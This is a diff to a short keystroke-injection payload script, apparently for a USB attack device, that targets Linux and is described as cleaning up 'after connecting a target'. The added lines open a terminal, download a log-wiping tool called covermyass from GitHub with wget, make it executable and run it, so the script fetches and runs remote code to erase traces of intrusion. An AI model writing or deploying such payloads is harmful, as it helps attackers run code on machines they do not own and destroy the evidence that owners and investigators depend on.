@@ -4,7 +4,7 @@ REM Description: clean up a little bit after connecting a target
 REM Target: Linux
 REM Props: Gallier
 REM Version: 1.0
-REM Category: 
+REM Category: untested
 
 
 REM ==================================================
@@ -12,4 +12,14 @@ REM = Start Program                                  =
 REM ==================================================
 
 DELAY 1000
-REM ... to be continued ...
+CTRL-ALT t
+DELAY 500
+STRING wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
+DELAY 5000
+STRING chmod +x covermyass
+DELAY 750
+STRING ./covermyass
+DELAY 1000
+REM ==================================================
+REM = END Program                                    =
+REM ==================================================
